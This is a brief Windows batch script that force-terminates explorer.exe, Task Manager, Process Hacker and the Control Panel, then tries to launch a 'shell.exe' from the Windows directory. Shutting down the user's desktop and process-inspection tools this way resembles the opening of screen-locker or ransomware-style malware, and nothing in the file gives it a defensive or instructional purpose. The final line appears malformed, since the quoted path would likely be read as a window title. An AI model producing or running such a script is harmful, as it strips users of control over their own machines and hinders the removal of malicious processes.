@echo off
taskkill /f /im explorer.exe
taskkill /f /im taskmgr.exe
taskkill /f /im ProcessHacker.exe
taskkill /f /im control.exe
start "%windir%\shell.exe"